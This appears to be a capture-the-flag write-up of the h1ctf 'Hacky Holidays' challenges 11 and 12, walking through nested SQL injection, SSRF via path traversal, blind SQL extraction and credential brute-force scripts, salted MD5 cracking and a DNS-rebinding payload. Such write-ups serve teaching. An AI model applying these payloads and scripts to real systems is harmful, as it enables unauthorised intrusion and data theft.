This looks very interesting. If we change the image URL, we may be able to perform a Server Side Request Forgery (SSRF) attack against the API, which in this case will make the API request come directly from the r3c0n server, and not from our IP. This may let us bypass the IP restriction on the API. Let us change the image property of the JSON object from `r3c0n_server_4fdk59\/uploads\/db507bdb186d33a719eb045603020cec.jpg` to `r3c0n_server_4fdk59\/api` and encode the the whole JSON object with base64 again. This will produce the following encoded data:

```
eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaSIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

And if we append it to the URL we get:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaSIsImF1dGgiOiJiYmYyOTVkNjg2YmQyYWYzNDZmY2Q4MGM1Mzk4ZGU5YSJ9
```

When we request the URL we get the following message: `invalid authentication hash`. So, there is some kind of authentication going on here. We will probably need to bypass that. 

Since the "hash" parameter on the albums page is vulnerable to a SQL injection, maybe we can influence the query in some way, and change the image URL in the JSON object and get the server to generate a valid hash for that new URL.

By exploiting the SQL injection using a union based query, we are able to modify the image path. The following value, sent to the album endpoint via the hash parameter, will result in modifying the image path:

```
a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

This query, will change the image path of in the returned JSON data object that is then sent to the picture endpoint. We can observe it by browsing to the following URL:

```
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT "2' UNION SELECT 1,1,'../api' --+-",1,1--+-
```

If we base64 decode the data parameter sent to the picture endpoint now, we see that it has changed to the following:

```
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api","auth":"38122d477657c1a0c9ba873c11017497"}
```

Now we are able to do a directory traversal via the image path, and the server will generate the hash for us. To make the testing a little easier we can use the following Python script to send a request with our chosen path, and get the data decoded and the HTTP response code and body from the picture request:

```python
import requests
import sys
from bs4 import BeautifulSoup
import base64

if len(sys.argv) != 2:
    print("(-) Usage: {} <PATH>".format(sys.argv[0]))
    sys.exit(1)

url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-".format(sys.argv[1])
response = requests.get(url) 
soup = BeautifulSoup(response.text, 'html.parser')
all_img = soup.find_all(class_="img-responsive")
interesting_image_src = all_img[1]['src']

data_content = base64.b64decode(interesting_image_src.split("?")[1].split("data")[1]).decode("utf-8")

image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
image_resp = requests.get(image_url)

print("{} - {} - {}".format(image_resp.status_code, data_content, image_resp.text))
```

We supply the script with the path that we would like generate a valid request towards, the script will then make the request and perform the union based sql injection, in order to modify the path and generate a valid hash. It will then perform the request for the image and it will print out the response code from the image request, the content of the data parameter (base64 decoded such that we are able to read the content) and the response text from the image.

If we look back at the API documentation we see that API will return a 404 response code when a request towards an endpoint that does not exists, it will return a 204 when you have a valid request, but no data is returned from the endpoint. The API will also return a 400 response when a invalid GET or POST request parameter is added. We can exploit these properties with the above script in order to infer information about the back-end. By running the script with the following paths: 

{F1138785}

We see that when we request the path "../api/endpoint" the picture endpoint will respond with the message "Expected HTTP status 200, Received: 404". So the request to "/api/endpoint" return a HTTP status code of 404. By playing around with this we can fuzz some common names of the API endpoints, and that is how we discover the "/api/user" endpoint. When we call the above script with "/api/user" we get a message of "Invalid content type detected", so this endpoint returns something else than the others who return 404. 

If we start to add parameters from to the "/api/user" endpoint we discover that adding a parameter of the name "test" the request results in a 400 response, and as the API documentation states, this is an "Invalid GET/POST variable". So if we fuzz the parameter name we find that both "username" and "password" are parameters that will results in a 204 response from the endpoint. It seems that the endpoint is vulnerable to a "Wilcard SQL LIKE"-injection attack. This means that the back-end query of the API is something like this:

```
SELECT * from users where username like '<USERINPUT>' and password like '<USERINPUT>'
```

The "%" operator in SQL is equivalent to any string of zero or more characters. If we send a request with the username parameter set equal to "a%" the API will return 204 if there exists no such user, and a 400 (Invalid content type) if the condition is valid. This is illustrated in the previous screenshot by submitting a query where the username is "a%" and a query where the username is set to "%g". So it looks like the username starts with a "g". 

To brute force the username and password would require a couple of requests, doing this by hand is a bit cumbersome. So we can create a small Python script to do the brute force for us. The python script is attached to the appendix section as flag11-bf.py. If we run the script we get the following output:

{F1138787}

The script is successfully able to brute force the username and password. This results in the username `grinchadmin` and the password `s4nt4sucks`. If we then navigate to the login page of the "attack box", that is linked to on the front page of the r3c0n server, and login with the credentials, we will see the following page:

{F1138788}

Flag 11 is: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`

* * * 

## Flag 12 - Attack box
Now that we have access to the Grinch network attack server, we must find a way to take it down, in order to stop the Grinch from launching his DDoS attack against Santa servers.

When one of the attack links is clicked, an URL like this is sent to the server:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

This will then launch an attack against the designated IP. If we focus our attention on the URL, we find the familiar "ey" pattern, so let us base64 decode the payload:

```
{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

Ok, so the target information is encoded in the payload. Let us try to launch a DDoS attack against 127.0.0.1 and see if we can take down the server. We first change the payload to this:

```
{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}
```

We then base64 encode it and append it to the URL. So we end up with this: `https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==`

If we open the URL, we get the following message: `Invalid Protection Hash`. So again the payload is protected by some kind of hash. 

The hash inside the JSON object looks like an MD5 hash, but the IP-address may be salted with a secret value before the MD5 sum is calculated. This may explain why neither Google or Crackstation is able to return the cleartext value of the hash. If we are going to crack the hash, we will need find the secret value. 

To find the secret value we can create a small Python script to prefix a word, from a wordlist, to the IP address. The script is listed in the appendix section named "md5cracker.py". The script stores each of the discovered hashes, and each of the valid IPs. It will then run through the wordlist and take the word from the wordlist, and append the ip to the word. It then calculates the MD5 hash of that string, and checks if the resulting hash is in the list of known hashes. If we run the script against the rockyou.txt wordlist (found in the Seclist project), we get the following result:

{F1138789}

This means that the IP is prefixed with the secret word `mrgrinch463` before it is MD5 hashed. Now we can test out if we can launch an attack on an IP of our choice, since we can calculate a valid hash for the target we would like the server to attack. Time to take the down the Grinchs network! 

We can now direct the server to 127.0.0.1 instead by calculating the md5 hash of the string "mrgrinch463127.0.0.1", which results in: "3e3f8df1658372edf0214e202acb460b". We then base64 encode the following payload

```
{"target":"127.0.0.1", "hash":"3e3f8df1658372edf0214e202acb460b"}
```

And append it to the URL like this:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCAiaGFzaCI6IjNlM2Y4ZGYxNjU4MzcyZWRmMDIxNGUyMDJhY2I0NjBiIn0=
```

We end up with the following results from the server:

{F1138792}

So in order to take down the server we must find a hosts that can bypass the detection of local targets, but still resolve to the attacking server. This sound very much like DNS rebinding. 

DNS rebinding is a very interesting attack. In practical terms it will let one host resolve to multiple IPs. A good tool to test for DNS rebinding attacks is this project on github: [https://github.com/taviso/rbndr](https://github.com/taviso/rbndr). From the README.md file we can see that the way to create a valid dns-rebinding host is like this:
```
<ipv4 in base-16>.<ipv4 in base-16>.rbndr.us
```

So if we take 127.0.0.1 and convert the address to hex we get "7f000001", and if we do the same for 203.0.113.33 we get "cb007121". If we put this together we get the following host that we can include in our payload: 

```
7f000001.cb007121.rbndr.us
```

We then create the payload and calculate the hash for the payload: 

```
{"target":"7f000001.cb007121.rbndr.us","hash":"54171d97f5299ef84c1c01a676eaa917"}
```

We base64 encode the payload and add it to the payload parameter in the URL. The full attack URL then looks like this:

```
https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jYjAwNzEyMS5yYm5kci51cyIsICJoYXNoIjoiNTQxNzFkOTdmNTI5OWVmODRjMWMwMWE2NzZlYWE5MTcifQ==
```

We can launch the attack by opening the URL in the browser, and the result looks like this:


{F1138793}

The host will sometimes resolve first to 127.0.0.1, which results in the attack failing, since this is a local IP. If this happens we just wait 15s (because of the server only allowing one request per 15 second), and open the URL again. If we watch the result closely, we see that the server resolves the hostname to "203.0.113.33", one of the original targets of the attack, but when the server does another DNS lookup on the host, when launching the attack, the DNS rebinding will result in the host now resolving to the local address of 127.0.0.1. So the attack will be launch against the local attack box. After a short amount of time we are redirected to the following screen:

{F1138794}

And that is it! We have successfully infiltrated the Grinchs network and taken down his attack server and saved the holidays.

Flag 12 is: `flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}`

* * * 
# Appendix

## flag9-solver.py
```python
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import sys
import string
from bs4 import BeautifulSoup

headers = {
    "User-Agent": "<marquee>Hackerman-script</marquee>",
    "Content-type": "application/x-www-form-urlencoded"
}

charset = string.ascii_lowercase + string.digits + string.ascii_uppercase 
base_url = "https://hackyholidays.h1ctf.com/evil-quiz"

bf_list = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation

if len(sys.argv) != 1:
    print("(-) Usage: {} ".format(sys.argv[0]))
    sys.exit(1)

cookies=dict()

def get_session():
    response = requests.get(base_url, headers=headers, allow_redirects=False)
    return response.cookies['session']

def initiate_session():
    sessionid = get_session()
    global cookies
    cookies=dict(session=sessionid + ";")
    requests.post(base_url, data={"name":"test"}, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
    quiz_data = {
        "ques_1": "0",
        "ques_2": "0",
        "ques_3": "0"
    }
    requests.post(base_url + "/start", data=quiz_data, headers=headers, cookies=cookies, allow_redirects=False, verify=False)


def check_condition(condition):
    payload = "admin' and ({}) -- ".format(condition)

    data={
        "name": payload
    }

    requests.post(base_url + "/", data=data, headers=headers, verify=False, allow_redirects=False, cookies=cookies)

    score_response = requests.get(base_url + "/score", verify=False, cookies=cookies)
    soup = BeautifulSoup(score_response.text, 'html.parser')
    container = soup.findAll('div')
    last_div = container[len(container) - 1]

    if int(last_div.text.split(" ")[2]) > 0:
        return True
    else:
        return False

def get_number_of_tables():
    for x in range(1, 100):
        if check_condition("select (select count(*) from information_schema.tables)={}".format(x)):
            return x
    return None

def get_string_length():
    for x in range(80, 85):
        if check_condition("select CONVERT((select count(*) from information_schema.tables), DECIMAL)='{}'".format(x)):
            return x

def get_length_of_table_name(table_number):
    for x in range(0, 85):
        if check_condition("select length((select table_name from information_schema.tables order by create_time desc limit {},1))='{}'".format(table_number, x)):
            return x



def get_lastest_created_table_name(table_length):
    name = ""
    for index in range(0, table_length + 1):
        for char in charset:
            if check_condition("select substring((select table_name from information_schema.tables order by create_time desc limit 0,1), {},1)='{}'".format(index, char)):
                name += char
                break

    return name

def get_length_of_column_name_in_table(column_index, table_name):
    for x in range(1, 85):
        if check_condition("select length((select column_name from information_schema.columns where table_name='{}' limit {},1))='{}'".format(table_name, column_index, x)):
            return x

def get_number_of_columns_from_table(table_name):
    for x in range(1, 85):
        if check_condition("select CONVERT((select count(column_name) from information_schema.columns where table_name='{}'), DECIMAL)='{}'".format(table_name, x)):
            return x

def get_column_name(table_name, column_index):
    column_name = ""
    length_of_column = get_length_of_column_name_in_table(column_index, table_name)
    print("Length of column_index: {}, in table: {}, is: {} char(s)".format(column_index, table_name, length_of_column))
    for index in range(1, length_of_column+1):
        for char in charset:
            if check_condition("select ascii(substring((select column_name from information_schema.columns where table_name='{}' limit {},1), {},1))='{}'".format(table_name, column_index, index, ord(char))):
                column_name += char
                break
    return column_name

def count_rows_in(table_name):
    for x in range(1, 100):
        if check_condition("select CONVERT((select count(*) from {}), DECIMAL)='{}'".format(table_name, x)):
            return x
    return None

def get_length_of_value(table_name, column_name, row_index):
     for x in range(1, 100):
        if check_condition("select length((select {} from {} order by {} asc limit {},1))='{}'".format(column_name, table_name, column_name, row_index, x)):
            return x
            

def get_table_row_from_column(table_name, row_index, column):
    value = ""
    value_length = get_length_of_value(table_name, column, row_index)
    print("Column: {}, in table: {} with row_index {} is {} char(s) long".format(column, table_name, row_index, value_length))
    for x in range(1, value_length+1):
        for char in bf_list:
            if check_condition("select ascii(substring((select {} from {} limit {},1), {}, 1))='{}'".format(column, table_name, row_index, x, ord(char))):
                value += char
                break
    return value


if __name__ == "__main__":
    initiate_session()
    table_name = get_lastest_created_table_name(get_length_of_table_name(0))
    print("Found table {}. Fetching number of columns...".format(table_name))
    rows_in_table = count_rows_in(table_name)
    print("Table: {} contains {} row(s)".format(table_name, rows_in_table))
    number_of_columns = get_number_of_columns_from_table(table_name)
    print("Table: {} contains {} column(s). Fetching column names..".format(table_name, number_of_columns))
    

    columns = []
    for x in range(0, number_of_columns):
        column_name = get_column_name(table_name, x)
        print("Found column: {} in table {}. Fetching content".format(column_name, table_name))
        column_value = get_table_row_from_column(table_name, 0, column_name)
        print("Column: {} in table: {} has value: {}".format(column_name, table_name, column_value))

```


## flag11-bf.py
```python
import requests
from bs4 import BeautifulSoup
import base64
import string

charset = string.ascii_lowercase + string.digits

base_url ="https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=a' UNION SELECT \"2' UNION SELECT 1,1,'{}' --+-\",1,1--+-"

def get_username():
    username = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = username + char
            path = "../api/user?username={}%25".format(test_string)
            url = base_url.format(path)
            if is_invalid_content_type(url):
                username += char 
                print(char, flush=True, end='')
                found_char_previous_run = True
                break
        
        if not found_char_previous_run:
            break
    return username

def get_password(username):
    password = ""
    while True:
        found_char_previous_run = False
        for char in charset:
            test_string = password + char
            path = "../api/user?username={}%26password={}%25".format(username, test_string)
            url = base_url.format(path)
            if is_invalid_content_type(url):
                password += char 
                print(char, flush=True, end='')
                found_char_previous_run = True
                break
        
        if not found_char_previous_run:
            break
    return password



def is_invalid_content_type(url):
    response = requests.get(url) 
    soup = BeautifulSoup(response.text, 'html.parser')
    all_img = soup.find_all(class_="img-responsive")
    interesting_image_src = all_img[1]['src']

    image_url = "https://hackyholidays.h1ctf.com{}".format(interesting_image_src)
    image_resp = requests.get(image_url)
    if image_resp.text == "Invalid content type detected":
        return True
    else:
        return False


username = get_username()
print("\nUsername is: {}".format(username))
password = get_password("grinchadmin")
print("\nThe password is: {}".format(password))
```

## md5cracker.py
```python
import hashlib
import sys

if len(sys.argv) != 2:
    print("(-) Usage: {} <WORDLIST>".format(sys.argv[0]))
    sys.exit(1)

wordlist = []

with(open(sys.argv[1], "r", encoding='ISO-8859-1')) as fp:
    for x in fp:
        wordlist.append(x.strip())

hashs = [
    "5f2940d65ca4140cc18d0878bc398955",
    "2814f9c7311a82f1b822585039f62607",
    "5aa9b5a497e3918c0e1900b2a2228c38",
]

ips = [
    "203.0.113.33",
    "203.0.113.53",
    "203.0.113.213"
]

for word in wordlist:
    for ip in ips:
        combined_word_ip = word+ip
        calculate_hash = hashlib.md5(combined_word_ip.encode('utf-8')).hexdigest()
        if calculate_hash in hashs:
            print("Got a hit for word: {} on hash: {} for ip {}".format(word, calculate_hash, ip))
```


* * *

## Impact

We have successfully infiltrated the Grinch Networks and taken them down! Effectively saving the holidays!

## Attachments
- initial-ctf-tweet.png
- F1.png
- flag1.png
- flag2-initial-page.png
- flag2-v2.png
- flag4-initial-ffuf.png
- flag4-pramater-bf-ffuf.png
- flag5-password-bf.png
- flag5-logged-in-user.png
- flag5-username-bf.png
- flag6-files-to-download.png
- flag6-zip-crack.png
- xxx.png
- flag-6-initial-fuzz.png
- flag6.png
- hate-mail-ffuf.png
- doubleeval.png
- flag7.png
- ffuf-forums-app.png
- forum-crackstation.png
- flag-forum.png
- evilquiz-start.png
- flag9-solver-run.png
- evil-quiz-flag.png
- signupmanager-initial-ffuf.png
- signup-manager-curl-users.txt.png
- signup-manager-malicious-payload.png
- signup-manager-flag.png
- recon-server-ffuf.png
- recon-server-api-doc.png
- flag11-helper-first-run.png
- flag11-user-pass-bf.png
- recon-server-flag.png
- attack-server-md5bf.png
- flag12-local-target-detected.png
- flag12-attack.png
- flag12.png
- flag1-initial-ffuf.png
